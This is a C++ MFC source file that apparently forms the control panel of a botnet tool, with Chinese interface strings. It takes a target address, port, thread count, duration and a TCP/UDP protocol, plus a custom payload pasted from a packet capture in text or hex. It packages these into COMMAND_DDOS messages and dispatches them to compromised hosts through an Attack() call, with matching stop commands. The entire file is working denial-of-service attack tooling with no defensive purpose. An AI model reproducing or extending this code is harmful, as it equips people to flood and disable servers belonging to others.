// DDOSZDY.cpp : implementation file
//
#include "stdafx.h"
#include "MainFrm.h"
#include "ClientView.h"
#include "Client.h"

#include "DDOSZDY.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pConnectView;
extern CMainFrame* g_pFrame;


int cbao=0;
int zbao=14;

int zhwt=0;
long m_nDataLength;
CString m_Data;

TCHAR hex2int(CString hex)
{
    int i;
    int result;
	
#ifdef _UNICODE
    TCHAR* pChar = hex.GetBuffer(0);
    i=swscanf(pChar, _T("%x"), &result);
#else
    const char* pChar = hex.GetBuffer(0);
    i=sscanf(pChar, _T("%x"), &result);
#endif
	
    if (i==1)
        return result;
	return 0;
}
/////////////////////////////////////////////////////////////////////////////
// CDDOSZDY

IMPLEMENT_DYNCREATE(CDDOSZDY, CFormView)

CDDOSZDY::CDDOSZDY()
	: CFormView(CDDOSZDY::IDD)
{
	//{{AFX_DATA_INIT(CDDOSZDY)
	isupdatedata = true;
	m_addr = _T("");
	m_addr2 = _T("");
	m_port = 80;
	m_port2 = 80;
	m_s1 = 0;
	m_s2 = 300;
	m_thread1 = 10;
	m_thread2 = 10;
	m_time = 10;
	m_time2 = 10;
	m_zdy = _T("请粘贴抓包内容,目前只支持最大1K数据");
	//}}AFX_DATA_INIT
}

CDDOSZDY::~CDDOSZDY()
{
}

void CDDOSZDY::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSZDY)
	DDX_Control(pDX, IDC_BUTTON_STOP2, m_Stop1);
	DDX_Control(pDX, IDC_BUTTON_BEGIN2, m_Start1);
	DDX_Control(pDX, IDC_BUTTON_STOP, m_Stop);
	DDX_Control(pDX, IDC_BUTTON_BEGIN, m_Start);
	DDX_Text(pDX, IDC_EDIT_ZDY, m_zdy);
	DDX_Text(pDX, IDC_EDIT_ADDR, m_addr);
	DDX_Text(pDX, IDC_EDIT_ADDR2, m_addr2);
	DDX_Text(pDX, IDC_EDIT_PORT, m_port);
//DDX_Text(pDX, 1066, m_port);
	DDX_Text(pDX, IDC_EDIT_PORT2, m_port2);
	DDX_Text(pDX, IDC_EDIT_S1, m_s1);
	DDX_Text(pDX, IDC_EDIT_S2, m_s2);
	DDX_Text(pDX, IDC_EDIT_THREAD, m_thread1);
	DDX_Text(pDX, IDC_EDIT_THREAD2, m_thread2);
	DDX_Text(pDX, IDC_EDIT_TIME, m_time);
	DDX_Text(pDX, IDC_EDIT_TIME2, m_time2);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDDOSZDY, CFormView)
	//{{AFX_MSG_MAP(CDDOSZDY)
	ON_BN_CLICKED(IDC_BUTTON_BEGIN, OnButtonBegin)
	ON_BN_CLICKED(IDC_BUTTON_BEGIN2, OnButtonBegin2)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	ON_BN_CLICKED(IDC_BUTTON_STOP2, OnButtonStop2)
	ON_BN_CLICKED(IDC_RADIO_ANSI, OnRadioAnsi)
	ON_BN_CLICKED(IDC_RADIO_HEX, OnRadioHex)
	ON_BN_CLICKED(IDC_RADIO_UDP, OnRadioUdp)
	ON_BN_CLICKED(IDC_RADIO_TCP, OnRadioTcp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOSZDY diagnostics

#ifdef _DEBUG
void CDDOSZDY::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSZDY::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CDDOSZDY message handlers

void CDDOSZDY::OnButtonBegin() 
{
	UpdateData(TRUE);
	// TODO: Add 	UpdateData(TRUE);
	if(cbao == 0)
	{
		MessageBox("请选择使用协议   ","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	if(zhwt == 0)
	{
		MessageBox("请选择发包方式   ","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	GetDlgItem(IDC_BUTTON_BEGIN)->EnableWindow(0);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(1);
	
	IMESSAGE *go=new IMESSAGE;
	IMESSAGE go1;
	go->msg_id=COMMAND_DDOS;
	
	memset(go->addr,0,sizeof(go1.addr));
	strcpy(go->addr,m_addr);
	
	go->port=m_port;
	
	go->time=m_time;
	
	go->thread=m_thread1;
	
	go->pt=cbao;
	
	memset(go->zdy,0,sizeof(go1.zdy));
	
	if(zhwt==1)
		strcpy(go->zdy,m_zdy);
	else
	{
		ConvertHexToData(m_zdy);
		strcpy(go->zdy,m_Data);
	}
		g_pConnectView->Attack( (BYTE*)go, sizeof(IMESSAGE));

// 	int n=pList->GetItemCount();
// 	for(int i=0;i<n;i++)
// 	{
// 		if (pList->GetCheck(i))
// 		{
// 			SOCKET SerSock = pList->GetItemData(i);
// 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
// 			pList->SetItemText(i,1,"活动");
// 		}
// 	}
// 	n=pMsg->GetItemCount();
// 	CTime time=CTime::GetCurrentTime();	
// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
// 	n=pMsg->GetItemCount();
// 	pMsg->InsertItem(n,m_strTime);
// 	pMsg->SetItemText(n,1,"被选主机已经进入攻击状态"); 
	
	
}

void CDDOSZDY::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
// 
// 	// TODO: Add your specialized code here and/or call the base class
// 	m_Start.SetIcon(IDI_Start);
// 	m_Stop.SetIcon(IDI_stop);
// 	m_Start1.SetIcon(IDI_Start);
// 	m_Stop1.SetIcon(IDI_stop);
// 	if (isupdatedata==true)
// 	{
// 		UpdateData(false);
// 		GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(0);
// 		GetDlgItem(IDC_BUTTON_STOP2)->EnableWindow(0);	
// 		isupdatedata=false;
// 		
// 	}
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

void CDDOSZDY::OnButtonBegin2() 
{
	UpdateData(TRUE);

	GetDlgItem(IDC_BUTTON_BEGIN2)->EnableWindow(0);
	GetDlgItem(IDC_BUTTON_STOP2)->EnableWindow(1);
	
    IMESSAGE *go=new IMESSAGE;
    IMESSAGE go1;
	go->msg_id=COMMAND_DDOS;

	memset(go->addr,0,sizeof(go1.addr));
	strcpy(go->addr,m_addr2);
	
	go->port=m_port2;
	
	go->time=m_time2;
	
	go->thread=m_thread2;
	
	go->pt=zbao;
	
	go->s=m_s1;
	
	go->s2=m_s2;

	memset(go->zdy,0,sizeof(go1.zdy));
		g_pConnectView->Attack( (BYTE*)go, sizeof(IMESSAGE));
}


	


void CDDOSZDY::OnButtonStop() 
{
	// TODO: Add your control notification handler code here
	GetDlgItem(IDC_BUTTON_BEGIN)->EnableWindow(1);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(0);
	
	IMESSAGE *go=new IMESSAGE;
	go->msg_id=DDOS_STOP;
	
	go->thread=m_thread1;
		g_pConnectView->StopAttack( (BYTE*)go, sizeof(IMESSAGE));

// 	int n=pList->GetItemCount();
// 	for(int i=0;i<n;i++)
// 	{
// 		if (pList->GetCheck(i))
// 		{
// 			SOCKET SerSock = pList->GetItemData(i);
// 			m_zdyiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
// 			pList->SetItemText(i,1,"待命");
// 		}
// 	}
// 	n=pMsg->GetItemCount();
// 	CTime time=CTime::GetCurrentTime();	
// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
// 	n=pMsg->GetItemCount();
// 	pMsg->InsertItem(n,m_strTime);
// 	pMsg->SetItemText(n,1,"被选主机已经停止攻击");
}
void CDDOSZDY::OnRadioTcp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	cbao=12;	
}

void CDDOSZDY::OnRadioUdp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	cbao=13;	
}
void CDDOSZDY::OnButtonStop2() 
{
	GetDlgItem(IDC_BUTTON_BEGIN2)->EnableWindow(1);
	GetDlgItem(IDC_BUTTON_STOP2)->EnableWindow(0);
	
	IMESSAGE *go=new IMESSAGE;
	go->msg_id=DDOS_STOP;
	
	go->thread=m_thread1;
		g_pConnectView->StopAttack( (BYTE*)go, sizeof(IMESSAGE));


}

void CDDOSZDY::OnRadioAnsi() 
{
	// TODO: Add your control notification handler code here
	zhwt=1;
}

void CDDOSZDY::OnRadioHex() 
{
	// TODO: Add your control notification handler code here
	zhwt=2;
}

// void CDDOSZDY::OnRadioMshl() 
// {
// 	UpdateData(TRUE);
// 	GetDlgItem(IDC_EDIT_PORT2)->EnableWindow(0);
// 	zbao=23;	
// }
// 
// void CDDOSZDY::OnRadioSjlu() 
// {
// 	UpdateData(TRUE);
// 	GetDlgItem(IDC_EDIT_PORT2)->EnableWindow(1);
// 	zbao=24;	
// }





void CDDOSZDY::ConvertHexToData(const CString &sHex)
{
    CString sEmpty("");
    CString sModHex = sHex;
    sModHex.Replace(_T(" "),_T(""));
    long nLength = sModHex.GetLength();
    if ((nLength % 2) != 0)
        return;
    for (int nFillLoop = 0; nFillLoop < (nLength/2); nFillLoop++)
        sEmpty += _T(" ");
    for (long nLoop=0; nLoop<(nLength/2); nLoop++)
    {
        CString sText = sModHex.Mid(nLoop*2,2);
        sEmpty.SetAt(nLoop,hex2int( sText ));
    }
    m_nDataLength = nLength/2;
    m_Data = sEmpty;
}

